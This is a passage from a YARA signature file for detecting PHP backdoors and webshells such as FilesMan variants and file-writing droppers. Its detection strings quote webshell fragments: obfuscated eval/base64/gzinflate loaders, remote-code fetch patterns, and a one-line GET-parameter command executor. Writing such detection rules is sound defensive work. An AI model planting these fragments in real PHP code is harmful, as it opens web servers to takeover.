private rule PR02211 : trigger
{
    strings:
        $ps0 = "echo(gzuncompress(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_100 : backdoor
{
    strings:
        $trigger = "strlen(trim($"
    condition:
        $trigger and PR02210 and PR02211
}

private rule PR02212 : trigger
{
    strings:
        $ps0 = "(fwrite($fp,"
    condition:
        $ps0
}

private rule PR02213 : trigger
{
    strings:
        $ps0 = "call_user_func_array($"
    condition:
        $ps0
}

private rule PR02214 : trigger
{
    strings:
        $ps0 = "explode(\",\", $init("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_101 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02212 and PR02213 and PR02214 and PR00357
}

private rule PR02215 : trigger
{
    strings:
        $ps0 = "echo 'FBI Warning"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_102 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR02215 and PR01569 and PR01431
}

private rule PR02216 : trigger
{
    strings:
        $ps0 = "= \"https://raw.githubusercontent.com/"
    condition:
        $ps0
}

private rule PR02217 : trigger
{
    strings:
        $ps0 = "(\"?>\".$"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_103 : backdoor
{
    strings:
        $trigger = "= \"\\x46\\x49\\x4c\\x45\\x5f\\x47\\x45\\x54\\x5f"
    condition:
        $trigger and PR02216 and PR02217
}

private rule PR02218 : trigger
{
    strings:
        $ps0 = ")) exit('ok');}"
    condition:
        $ps0
}

private rule PR02219 : trigger
{
    strings:
        $ps0 = "@file_get_contents(base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_104 : backdoor
{
    strings:
        $trigger = "if(md5(@$_POST["
    condition:
        $trigger and PR01021 and PR02218 and PR02219
}

private rule PR02220 : trigger
{
    strings:
        $ps0 = "file(base64_decode(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_105 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02220 and PR00355 and PR02206 and PR00357
}

// MANUAL FIX NECESSARY
rule php_backdoor_file_get_contents_107 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_file_get_contents_107_r0 = /eval\s*\(\s*file_get_contents\(.http:\/\/\S+\.txt.\)\s*\)\s*;/
    condition:
        $trigger and PR01431 and $php_backdoor_file_get_contents_107_r0
}

private rule PR02221 : trigger
{
    strings:
        $ps0 = "ignore_user_abort(true);"
    condition:
        $ps0
}

private rule PR02222 : trigger
{
    strings:
        $ps0 = "\\x6b\\x69\\x6c\\154\\40\\x60\\x70\\163"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_110 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02221 and PR02222 and PR01899
}

private rule PR02223 : trigger
{
    strings:
        $ps0 = "0777, true);$"
    condition:
        $ps0
}

private rule PR02224 : trigger
{
    strings:
        $ps0 = "@mkdir($"
    condition:
        $ps0
}

rule php_backdoor_file_get_contents_111 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02223 and PR02224 and PR00357
}

rule php_backdoor_file_put_contents_001 : backdoor
{
    strings:
        $trigger = "'.base64_decode($_REQUEST["
    condition:
        $trigger and PR01710
}

private rule PR02225 : trigger
{
    strings:
        $ps0 = "; file_put_contents($"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_001_02 : backdoor
{
    strings:
        $trigger = "); unlink($"
    condition:
        $trigger and PR02225 and PR01351
}

private rule PR02226 : trigger
{
    strings:
        $ps0 = ";if(isset($_GET[1])){$_=$_GET;$_[1]($_[2]);exit;}"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_002 : backdoor
{
    strings:
        $trigger = "<?php print"
    condition:
        $trigger and PR02226
}

private rule PR02227 : trigger
{
    strings:
        $ps0 = "if(isset($_GET[1])){$_=$_GET;$_[1]($_[2]);exit;}"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_002_02 : backdoor
{
    strings:
        $trigger = ", '<?php print"
    condition:
        $trigger and PR02227
}

private rule PR02228 : trigger
{
    strings:
        $ps0 = "echo exec('crontab"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_003 : backdoor
{
    strings:
        $trigger = "$argv["
    condition:
        $trigger and PR00435 and PR02228
}

private rule PR02229 : trigger
{
    strings:
        $ps0 = "@extract ($_REQUEST);"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_004 : backdoor
{
    strings:
        $trigger = "urldecode($"
    condition:
        $trigger and PR00435 and PR02229
}

// MANUAL FIX NECESSARY
private rule PR02230 : trigger
{
    strings:
        $ps0 = "file_put_contents($_GET["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_006 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_file_put_contents_006_r0 = /file_get_contents\(\$[\w]+\);[\s]*\$[\w]+[\s]*=[\s]*base64_decode\(\$[\w]+\);[\s]*file_put_contents\(\$_GET\[.[\w]+.\],[\s]*\$[\w]+\);/
    condition:
        $trigger and PR02230 and $php_backdoor_file_put_contents_006_r0
}

rule php_backdoor_file_put_contents_008 : backdoor
{
    strings:
        $trigger = ");die();}else{@eval($"
    condition:
        $trigger and PR00435 and PR01804 and PR02103
}

private rule PR02231 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL, \"http"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_009 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01710 and PR02231 and PR00397 and PR01445
}

rule php_backdoor_file_put_contents_010 : backdoor
{
    strings:
        $trigger = "chr(112).chr(97).chr(103).chr(101).chr(110).chr(111).chr(116).chr(102).chr(111).chr(117).chr(117).chr(117).chr(110).chr(100)"
    condition:
        $trigger and PR00435 and PR02103
}

private rule PR02232 : trigger
{
    strings:
        $ps0 = ".= fread($"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_011 : backdoor
{
    strings:
        $trigger = "foreach(array(\"a\", \"b\", \"c\") as $"
    condition:
        $trigger and PR02232 and PR01490
}

rule php_backdoor_file_put_contents_012 : backdoor
{
    strings:
        $trigger = "fputs($f,$_REQUEST['1f2e07a681480"
    condition:
        $trigger
}

private rule PR02233 : trigger
{
    strings:
        $ps0 = "PD9waHAgZmlsZV9wdXRfY29udGVudHM"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_013 : backdoor
{
    strings:
        $trigger = "!is_dir("
    condition:
        $trigger and PR00435 and PR02233
}

private rule PR02234 : trigger
{
    strings:
        $ps0 = ", 0777, true);"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_014 : backdoor
{
    strings:
        $trigger = "exec('rm"
    condition:
        $trigger and PR00435 and PR01415 and PR02234
}

private rule PR02235 : trigger
{
    strings:
        $ps0 = "isset(${\"\\x5fG\\x45T\"}[\"\\x57\\x6f\\x72\\x64\\x50\\x72\\x65\\x73\\x73\"])?$"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_015 : backdoor
{
    strings:
        $trigger = "wp-blog-header"
    condition:
        $trigger and PR02235
}

private rule PR02236 : trigger
{
    strings:
        $ps0 = "file_put_contents($_POST['wp_filename'], $_POST["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_016 : backdoor
{
    strings:
        $trigger = "(isset($_POST["
    condition:
        $trigger and PR02236
}

private rule PR02237 : trigger
{
    strings:
        $ps0 = "sys_get_temp_dir().'/session_'.rand("
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_017 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR02237 and PR02165
}

private rule PR02238 : trigger
{
    strings:
        $ps0 = "echo json_encode(["
    condition:
        $ps0
}

private rule PR02239 : trigger
{
    strings:
        $ps0 = "__DIR__ ."
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_018 : backdoor
{
    strings:
        $trigger = "status' => 'OK"
    condition:
        $trigger and PR00435 and PR02238 and PR02239
}

rule php_backdoor_file_put_contents_019 : backdoor
{
    strings:
        $trigger = "base64_decode(rawurldecode((urlencode(urldecode($_REQUEST["
    condition:
        $trigger and PR02020
}

private rule PR02240 : trigger
{
    strings:
        $ps0 = "touch(dirname(__FILE__).$"
    condition:
        $ps0
}

private rule PR02241 : trigger
{
    strings:
        $ps0 = "@opendir(dirname(__FILE__));"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_023 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02240 and PR02241
}

private rule PR02242 : trigger
{
    strings:
        $ps0 = "$_GET) && md5($_GET['key']) =="
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_024 : backdoor
{
    strings:
        $trigger = ", 0777, true);"
    condition:
        $trigger and PR00435 and PR02242
}

private rule PR02243 : trigger
{
    strings:
        $ps0 = "file_put_contents($pluginPath."
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_025 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02243 and PR01021 and PR02141
}

private rule PR02244 : trigger
{
    strings:
        $ps0 = "return call_user_func_array(\"pack\", array_merge(array("
    condition:
        $ps0
}

private rule PR02245 : trigger
{
    strings:
        $ps0 = "php://input"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_026 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02244 and PR01021 and PR02141 and PR02245
}

private rule PR02246 : trigger
{
    strings:
        $ps0 = "JiBtZDUoJF9SRVFVRVNUWy"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_027 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR02246 and PR01468
}

private rule PR02247 : trigger
{
    strings:
        $ps0 = "require_once \"php\".\":"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_028 : backdoor
{
    strings:
        $trigger = "tempnam(sys_get_temp_dir(),"
    condition:
        $trigger and PR00435 and PR02247
}

private rule PR02248 : trigger
{
    strings:
        $ps0 = "\"{$compressprotocol}://{$up_localpath}/{$unmute_payload}\");"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_029 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01710 and PR02248
}

private rule PR02249 : trigger
{
    strings:
        $ps0 = "&& @trim($_POST["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_030 : backdoor
{
    strings:
        $trigger = "file_put_contents($"
    condition:
        $trigger and PR02249 and PR01351
}

private rule PR02250 : trigger
{
    strings:
        $ps0 = "]($_COOKIE, $_POST);"
    condition:
        $ps0
}

private rule PR02251 : trigger
{
    strings:
        $ps0 = "array();"
    condition:
        $ps0
}

private rule PR02252 : trigger
{
    strings:
        $ps0 = "@include"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_031 : backdoor
{
    strings:
        $trigger = "exit();"
    condition:
        $trigger and PR02250 and PR02251 and PR02252 and PR02141
}

private rule PR02253 : trigger
{
    strings:
        $ps0 = ");}die();}echo md5("
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_032 : backdoor
{
    strings:
        $trigger = "=$_REQUEST; if(isset($"
    condition:
        $trigger and PR02253
}

private rule PR02254 : trigger
{
    strings:
        $ps0 = "print(file_put_contents($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_033 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR02254
}

private rule PR02255 : trigger
{
    strings:
        $ps0 = "php',base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_034 : backdoor
{
    strings:
        $trigger = "file_put_contents($"
    condition:
        $trigger and PR02255
}

private rule PR02256 : trigger
{
    strings:
        $ps0 = "PD9waHAgJG"
    condition:
        $ps0
}

private rule PR02257 : trigger
{
    strings:
        $ps0 = "DOCUMENT_ROOT"
    condition:
        $ps0
}

private rule PR02258 : trigger
{
    strings:
        $ps0 = ");echo"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_035 : backdoor
{
    strings:
        $trigger = "@unlink(__FILE__);"
    condition:
        $trigger and PR02256 and PR02257 and PR02258
}

private rule PR02259 : trigger
{
    strings:
        $ps0 = "scandir($"
    condition:
        $ps0
}

private rule PR02260 : trigger
{
    strings:
        $ps0 = "function recurDirRW($"
    condition:
        $ps0
}

private rule PR02261 : trigger
{
    strings:
        $ps0 = "md5($"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_036 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02259 and PR01021 and PR02260 and PR02261 and PR02141
}

private rule PR02262 : trigger
{
    strings:
        $ps0 = "&& md5($"
    condition:
        $ps0
}

private rule PR02263 : trigger
{
    strings:
        $ps0 = "}else{echo"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_037 : backdoor
{
    strings:
        $trigger = "@include(sys_get_temp_dir()."
    condition:
        $trigger and PR00435 and PR02262 and PR02263 and PR02103
}

private rule PR02264 : trigger
{
    strings:
        $ps0 = ".serialize($_POST))."
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_038 : backdoor
{
    strings:
        $trigger = "@base64_encode($query."
    condition:
        $trigger and PR00435 and PR02144 and PR02264
}

private rule PR02265 : trigger
{
    strings:
        $ps0 = "mb_strlen(\"true_plugins_activate\")"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_039 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02265 and PR01468
}

private rule PR02266 : trigger
{
    strings:
        $ps0 = ".php', file_get_contents('http:"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_040 : backdoor
{
    strings:
        $trigger = "print_r(scandir('.'));"
    condition:
        $trigger and PR00029 and PR02266
}

private rule PR02267 : trigger
{
    strings:
        $ps0 = "if(md5(@$_POST["
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_041 : backdoor
{
    strings:
        $trigger = "file_put_contents($"
    condition:
        $trigger and PR01351 and PR02267
}

private rule PR02268 : trigger
{
    strings:
        $ps0 = "\"f\".\"i\".\"l\".\"e\".\"_\".\"p\".\"u\".\"t\".\"_\".\"c\".\"o\".\"n\".\"t\".\"e\".\"n\".\"t\".\"s\";"
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_042 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR02268 and PR00203
}

private rule PR02269 : trigger
{
    strings:
        $ps0 = "str_replace(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_file_put_contents_043 : backdoor
{
    strings:
        $trigger = "=mt_rand(0,$"
    condition:
        $trigger and PR00435 and PR02269
}

private rule PR02270 : trigger
{
    strings:
        $ps0 = "$admin['pass']  =  '"
    condition:
        $ps0
}

rule php_backdoor_filesman_001_001 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02270
}

private rule PR02271 : trigger
{
    strings:
        $ps0 = "$pass = \"./pass.txt\";"
    condition:
        $ps0
}

rule php_backdoor_filesman_001_002 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02271
}

rule php_backdoor_filesman_001_009 : backdoor
{
    strings:
        $trigger = "$____=base64_decode('eJ"
    condition:
        $trigger
}

private rule PR02272 : trigger
{
    strings:
        $ps0 = "case 'create_symlink':"
    condition:
        $ps0
}

rule php_backdoor_filesman_001_010 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02272
}

rule php_backdoor_filesman_001_011 : backdoor
{
    strings:
        $trigger = "gzuncompress(base64_decode(\"eJzlvX1XGzcTOPo3PaffQWz9"
    condition:
        $trigger
}

private rule PR02273 : trigger
{
    strings:
        $ps0 = "$wpplugin_charset = 'Windows-1251"
    condition:
        $ps0
}

rule php_backdoor_filesman_001_013 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02273
}

rule php_backdoor_filesman_001_014 : backdoor
{
    strings:
        $trigger = ";preg_replace(\"/.*/\".'e',chr(101).chr(118).chr(97).chr(108).chr(40).chr(103)"
    condition:
        $trigger
}

rule php_backdoor_filesman_001_015 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"CiRhd"
    condition:
        $trigger
}

rule php_backdoor_filesman_001_016 : backdoor
{
    strings:
        $trigger = "gzuncompress(base64_decode('eF5MmseutFyWpud9FaW/S8pWUd0QEDi1eoD33qOUUtjAe3"
    condition:
        $trigger
}

rule php_backdoor_filesman_002_005 : backdoor
{
    strings:
        $trigger = "$default_action=\"FilesMan\";"
    condition:
        $trigger
}

private rule PR02274 : trigger
{
    strings:
        $ps0 = "buffer.='8VsdF9hY3Rpb24gPSAnRmlsZ"
    condition:
        $ps0
}

rule php_backdoor_filesman_002_006 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02274
}

rule php_backdoor_filesman_002_010 : backdoor
{
    strings:
        $trigger = "$default_action = base64_decode('RmlsZXNNYW4=');"
    condition:
        $trigger
}

private rule PR02275 : trigger
{
    strings:
        $ps0 = "cxh}i?AE&wyMFq(D5ZJLgTR.2vOd1GWprt4,Xm/z~3I_K`P!860[a"
    condition:
        $ps0
}

rule php_backdoor_filesman_002_07 : backdoor
{
    strings:
        $trigger = "*/"
    condition:
        $trigger and PR02275
}

rule php_backdoor_filesman_003 : backdoor
{
    strings:
        $trigger = "\"<!-- g('FilesMan','c:/') --!>\";"
    condition:
        $trigger
}

rule php_backdoor_filesman_004 : backdoor
{
    strings:
        $trigger = "$allsites_home.\"</homepath><addiction>\".$addiction_dir.\"</addiction></data>\";"
    condition:
        $trigger and PR00507
}

rule php_backdoor_filesman_005 : backdoor
{
    strings:
        $trigger = "eval(xxtea_decrypt(base64_decode($string"
    condition:
        $trigger
}

rule php_backdoor_filesman_007 : backdoor
{
    strings:
        $trigger = "eval(\"return eval(\\\"$ed__k\\\")"
    condition:
        $trigger
}

rule php_backdoor_filesman_008 : backdoor
{
    strings:
        $trigger = "('ZXZhbCgiXHg2NVx4NzZceDYxXHg2Q1x4MjhceDY3XHg3QVx4Nj"
    condition:
        $trigger and PR01353
}

rule php_backdoor_filesman_010 : backdoor
{
    strings:
        $trigger = "gzuncompress(base64_decode($techgaun)));?>"
    condition:
        $trigger
}

private rule PR02276 : trigger
{
    strings:
        $ps0 = "echo 'walex';"
    condition:
        $ps0
}

rule php_backdoor_filesman_011 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR02276
}

rule php_backdoor_filesman_012 : backdoor
{
    strings:
        $trigger = "$shellname.'\\';$myurl="
    condition:
        $trigger
}

rule php_backdoor_filesman_013 : backdoor
{
    strings:
        $trigger = "REQUEST['lel1'](\"{$_REQUEST['lel2"
    condition:
        $trigger
}

rule php_backdoor_filesman_014 : backdoor
{
    strings:
        $trigger = "ini_set('log_errors',0); ini_set('max_execution_time',0);if(isset($_GET[gotop"
    condition:
        $trigger
}

private rule PR02277 : trigger
{
    strings:
        $ps0 = "CiRhdXRoX3Bhc3Mg"
    condition:
        $ps0
}

rule php_backdoor_filesman_015 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR02277
}

private rule PR02278 : trigger
{
    strings:
        $ps0 = "php'; $filedata = base64_decode("
    condition:
        $ps0
}

rule php_backdoor_filesman_015_02 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR02277 and PR02278
}

rule php_backdoor_filesman_017 : backdoor
{
    strings:
        $trigger = "eval(\"return eval(\\\"$"
    condition:
        $trigger
}

private rule PR02279 : trigger
{
    strings:
        $ps0 = "$bs=\"esM\";"
    condition:
        $ps0
}

rule php_backdoor_filesman_018 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28"
    condition:
        $trigger and PR02279
}

private rule PR02280 : trigger
{
    strings:
        $ps0 = "Error_Reporting(0); $xJdU8NfauOq=\""
    condition:
        $ps0
}

rule php_backdoor_filesman_019 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28"
    condition:
        $trigger and PR02280
}

rule php_backdoor_filesman_020 : backdoor
{
    strings:
        $trigger = "\"   .  \"\\x3b\");exit;"
    condition:
        $trigger
}

private rule PR02281 : trigger
{
    strings:
        $ps0 = "eNpNnFev'  . '69x6Xu/9"
    condition:
        $ps0
}

rule php_backdoor_filesman_022 : backdoor
{
    strings:
        $trigger = "\"\\x3b\");exit;"
    condition:
        $trigger and PR02281 and PR01932
}

rule php_backdoor_filesman_023 : backdoor
{
    strings:
        $trigger = "extract(array(\"default_action\" => 'FilesMan'"
    condition:
        $trigger
}

private rule PR02282 : trigger
{
    strings:
        $ps0 = "$code = base64_decode(\""
    condition:
        $ps0
}

private rule PR02283 : trigger
{
    strings:
        $ps0 = "function decode($"
    condition:
        $ps0
}

private rule PR02284 : trigger
{
    strings:
        $ps0 = "$code = decode($code);"
    condition:
        $ps0
}

rule php_backdoor_filesman_025 : backdoor
{
    strings:
        $trigger = "eval($code);"
    condition:
        $trigger and PR02282 and PR02283 and PR02284
}

rule php_backdoor_filesman_026 : backdoor
{
    strings:
        $trigger = "eval($_b($newphrase));"
    condition:
        $trigger and PR01450
}

private rule PR02285 : trigger
{
    strings:
        $ps0 = "eval(base64_decode(gzuncompress(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_filesman_027 : backdoor
{
    strings:
        $trigger = "wOPzyxO\";"
    condition:
        $trigger and PR02285
}

private rule PR02286 : trigger
{
    strings:
        $ps0 = ".'538VZ9L/Vb3NWPbJXvyVJltBYP+XF9mUF3/9+19i3KD8ZkfCJyRBVz6r6vO6mSaJ'"
    condition:
        $ps0
}

rule php_backdoor_filesman_028 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR02286 and PR00029
}

private rule PR02287 : trigger
{
    strings:
        $ps0 = "FOPO - Free Online PHP Obfuscator"
    condition:
        $ps0
}

rule php_backdoor_filesman_029 : backdoor
{
    strings:
        $trigger = "Checksum: 34d3990d882fde91e559cca6a72d559814be9d2a"
    condition:
        $trigger and PR00029 and PR02287
}

rule php_backdoor_filesman_029_002 : backdoor
{
    strings:
        $trigger = "Checksum: ac062a934f16e2a43f8cb2c33b59a8c5f47370ba"
    condition:
        $trigger and PR00029 and PR02287
}

rule php_backdoor_filesman_029_003 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode("
    condition:
        $trigger and PR02127
}

private rule PR02288 : trigger
{
    strings:
        $ps0 = "$imgData = @$"
    condition:
        $ps0
}

rule php_backdoor_filesman_029_04 : backdoor
{
    strings:
        $trigger = "File"
    condition:
        $trigger and PR02288
}

private rule PR02289 : trigger
{
    strings:
        $ps0 = "thawte.com-"
    condition:
        $ps0
}

private rule PR02290 : trigger
{
    strings:
        $ps0 = "$track_id.$captureNote"
    condition:
        $ps0
}

rule php_backdoor_filesman_030 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR02289 and PR02290
}

rule php_backdoor_filesman_031 : backdoor
{
    strings:
        $trigger = "$fn=create_function('',(\"};\".strrev(urldecode(str_replace(\".\",\"%\",\".3B.29.22"
    condition:
        $trigger
}

private rule PR02291 : trigger
{
    strings:
        $ps0 = "=\"\\x70\\x72\".chr(101).chr(103)"
    condition:
        $ps0
}

rule php_backdoor_filesman_032 : backdoor
{
    strings:
        $trigger = "if(isset($_GET['pwd'])) {"
    condition:
        $trigger and PR02291
}

private rule PR02292 : trigger
{
    strings:
        $ps0 = "default_action"
    condition:
        $ps0
}

rule php_backdoor_filesman_033 : backdoor
{
    strings:
        $trigger = "eval(\"\\x65\\x76\\x61\\x6C"
    condition:
        $trigger and PR02292 and PR02127
}

private rule PR02293 : trigger
{
    strings:
        $ps0 = " file(__FILE__)),$match)?($match[1]):\"\").\""
    condition:
        $ps0
}

rule php_backdoor_filesman_034 : backdoor
{
    strings:
        $trigger = "(preg_match(\"#/\\*\\*(.*)\\*\\*/#se\""
    condition:
        $trigger and PR02293
}

private rule PR02294 : trigger
{
    strings:
        $ps0 = "array(97,115,115,101,114,116)"
    condition:
        $ps0
}

rule php_backdoor_filesman_035 : backdoor
{
    strings:
        $trigger = "canonical_parse($enc"
    condition:
        $trigger and PR02294
}

private rule PR02295 : trigger
{
    strings:
        $ps0 = "array('bbbpubghostbbb','bbbhtaghostbbb','bbbsghostbbb','bbbdotghostbbb');"
    condition:
        $ps0
}

rule php_backdoor_filesman_036 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR02295
}

rule php_backdoor_filesman_037 : backdoor
{
    strings:
        $trigger = "File'.'sMan'; ## def function"
    condition:
        $trigger
}

rule php_backdoor_filesman_038 : backdoor
{
    strings:
        $trigger = "eval(gzuncompress(\""
    condition:
        $trigger
}

rule php_backdoor_filesman_038_002 : backdoor
{
    strings:
        $trigger = "eval(gzuncompress('"
    condition:
        $trigger
}

private rule PR02296 : trigger
{
    strings:
        $ps0 = "$default_action = 'F"
    condition:
        $ps0
}

rule php_backdoor_filesman_039 : backdoor
{
    strings:
        $trigger = "{header('HTTP/1.0 404 Not Found');exit;}"
    condition:
        $trigger and PR02296
}

private rule PR02297 : trigger
{
    strings:
        $ps0 = "return base64_decode($"
    condition:
        $ps0
}

private rule PR02298 : trigger
{
    strings:
        $ps0 = "'=>'"
    condition:
        $ps0
}

private rule PR02299 : trigger
{
    strings:
        $ps0 = "= Array('"
    condition:
        $ps0
}

private rule PR02300 : trigger
{
    strings:
        $ps0 = ".= isset($"
    condition:
        $ps0
}

private rule PR02301 : trigger
{
    strings:
        $ps0 = "for($i=0; $i < strlen($"
    condition:
        $ps0
}

rule php_backdoor_filesman_041 : backdoor
{
    strings:
        $trigger = "= '';"
    condition:
        $trigger and PR00029 and PR02297 and PR02298 and PR02299 and PR02300 and PR02301
}

private rule PR02302 : trigger
{
    strings:
        $ps0 = "=fopen(__FILE__,'r');fseek($"
    condition:
        $ps0
}

rule php_backdoor_filesman_042 : backdoor
{
    strings:
        $trigger = "eval(bzdecompress($"
    condition:
        $trigger and PR02302
}

rule php_backdoor_filesman_043 : backdoor
{
    strings:
        $trigger = ")));@eval($eval);"
    condition:
        $trigger and PR01421
}

rule php_backdoor_filesman_044 : backdoor
{
    strings:
        $trigger = "$code=@urldecode($code);$code=@strrev($code);@eval($code);"
    condition:
        $trigger and PR01789
}

private rule PR02303 : trigger
{
    strings:
        $ps0 = "($OUT));return;"
    condition:
        $ps0
}

private rule PR02304 : trigger
{
    strings:
        $ps0 = ";$OUT=alfa($OUT);eval($"
    condition:
        $ps0
}

rule php_backdoor_filesman_045 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR02303 and PR02304
}

private rule PR02305 : trigger
{
    strings:
        $ps0 = "(\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x24\\x76\\x29);\");"
    condition:
        $ps0
}

rule php_backdoor_filesman_046 : backdoor
{
    strings:
        $trigger = "\".\""
    condition:
        $trigger and PR02305 and PR01613 and PR01611
}

private rule PR02306 : trigger
{
    strings:
        $ps0 = "CZILC2IpKXppcJIikoOiforpwuShFMa0fbkVwociduYlKXp9tmklfuaZdJELcoy0CTShgWplGol0KXP7VI`wNfrBfoguULSf"
    condition:
        $ps0
}

rule php_backdoor_filesman_047 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR02306
}

private rule PR02307 : trigger
{
    strings:
        $ps0 = "))));"
    condition:
        $ps0
}

private rule PR02308 : trigger
{
    strings:
        $ps0 = "= \"\";$"
    condition:
        $ps0
}

private rule PR02309 : trigger
{
    strings:
        $ps0 = "= true;$"
    condition:
        $ps0
}

private rule PR02310 : trigger
{
    strings:
        $ps0 = "= \"str_rot13\";"
    condition:
        $ps0
}

private rule PR02311 : trigger
{
    strings:
        $ps0 = "= \"gzuncompress\";"
    condition:
        $ps0
}

private rule PR02312 : trigger
{
    strings:
        $ps0 = "= implode(\"\", $"
    condition:
        $ps0
}

private rule PR02313 : trigger
{
    strings:
        $ps0 = "= array('"
    condition:
        $ps0
}

private rule PR02314 : trigger
{
    strings:
        $ps0 = "= false;$"
    condition:
        $ps0
}

rule php_backdoor_filesman_048 : backdoor
{
    strings:
        $trigger = ";eval("
    condition:
        $trigger and PR02307 and PR02308 and PR02309 and PR02310 and PR02311 and PR02312 and PR02313 and PR02314 and PR01713
}

rule php_backdoor_filesman_049 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('5b39dxq3EjD8c+"
    condition:
        $trigger
}

private rule PR02315 : trigger
{
    strings:
        $ps0 = "@set_time_limit(0);"
    condition:
        $ps0
}

rule php_backdoor_filesman_050 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode("
    condition:
        $trigger and PR01789 and PR02315
}

private rule PR02316 : trigger
{
    strings:
        $ps0 = "QAIAPD9waHAgABEkY29sb3IgPSAAACIjZGY1IjsgICRkZWZhdWwAgHRf"
    condition:
        $ps0
}

rule php_backdoor_filesman_051 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02316
}

private rule PR02317 : trigger
{
    strings:
        $ps0 = "(\"QAAAPD"
    condition:
        $ps0
}

rule php_backdoor_filesman_052 : backdoor
{
    strings:
        $trigger = ".\"<\".\"?\";"
    condition:
        $trigger and PR00029 and PR01422 and PR02317
}

private rule PR02318 : trigger
{
    strings:
        $ps0 = "BACgZGl2J8Fib2R5AIFodG0AAGw+\"));"
    condition:
        $ps0
}

rule php_backdoor_filesman_052_02 : backdoor
{
    strings:
        $trigger = ".\"<\".\"?\";"
